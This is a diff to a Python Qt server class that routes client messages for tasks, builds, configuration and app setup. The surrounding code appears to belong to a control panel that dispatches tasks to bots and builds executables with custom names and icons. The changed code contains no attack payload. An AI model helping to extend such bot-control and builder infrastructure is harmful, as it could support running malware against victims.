@@ -1,10 +1,11 @@
+from qasync import asyncSlot
 from qtpy.QtCore import Signal
-
 from QtPyNetwork.server import QThreadedServer
 
-from qasync import asyncSlot
+import socket
 
 from models import Task, Info
+from core.crypto import generate_key
 
 
 class GUIServer(QThreadedServer):
@@ -18,14 +19,31 @@ class GUIServer(QThreadedServer):
     build_stop = Signal(int)
     build_options = Signal(int)
 
+    get_config = Signal(int)
+    save_config = Signal(int, dict)
+
+    restart_app = Signal()
+    close_app = Signal()
+
+    setup_options = Signal(int)
+
     def __init__(self):
         super(GUIServer, self).__init__()
+
+    @asyncSlot()
+    async def start_setup(self):
+        ip = socket.gethostbyname(socket.gethostname())
+        with socket.socket() as s:
+            s.bind(('', 0))
+            port = s.getsockname()[1]
+        key = generate_key()
+        return ip, port, key
 
     @asyncSlot(int, dict)
     async def on_message(self, device_id: int, message: dict):
         event_type = message.get("event_type")
+        event = message.get("event")
         if event_type == "task":
-            event = message.get("event")
             if event == "options":
                 self.get_tasks.emit(device_id)
 
@@ -39,13 +57,62 @@ class GUIServer(QThreadedServer):
                 self.force_start_task.emit(message.get("bot_id"), message.get("task_id"))
 
         elif event_type == "build":
-            event = message.get("event")
             if event == "start":
                 self.build_start.emit(device_id, message.get("name"), message.get("icon"), message.get("generators"))
             elif event == "options":
                 self.build_options.emit(device_id)
             elif event == "stop":
                 self.build_stop.emit(device_id)
+
+        elif event_type == "config":
+            if event == "get":
+                self.get_config.emit(device_id)
+            elif event == "save":
+                self.save_config.emit(device_id, message.get("config"))
+
+        elif event_type == "app":
+            if event == "restart":
+                self.restart_app.emit()
+            elif event == "close":
+                self.close_app.emit()
+
+        elif event_type == "setup":
+            if event == "options":
+                self.setup_options.emit(device_id)
+
+    @asyncSlot(int, dict)
+    async def on_setup_options(self, client_id, options):
+        self.write(client_id, {"event_type": "setup",
+                               "event": "options",
+                               "options": options})
+
+    @asyncSlot(int)
+    async def on_connected_no_config(self, client_id):
+        self.write(client_id, {"event_type": "app",
+                               "event": "setup"})
+
+    @asyncSlot(int, str)
+    async def on_config_error(self, client_id, error):
+        self.write(client_id, {"event_type": "config",
+                               "event": "error",
+                               "error": error})
+
+    @asyncSlot(int)
+    async def on_config_saved(self, client_id):
+        self.write(client_id, {"event_type": "config",
+                               "event": "saved"})
+
+    @asyncSlot(int, dict)
+    async def on_config_get(self, client_id, config):
+        self.write(client_id, {"event_type": "config",
+                               "event": "get",
+                               "config": config})
+
+    @asyncSlot(int, str)
+    async def on_config_validation_error(self, client_id, error):
+        self.write(client_id, {"event_type": "config",
+                               "event": "validate_error",
+                               "error": error})
 
     @asyncSlot(int, list)
     async def on_get_tasks(self, client_id, tasks):
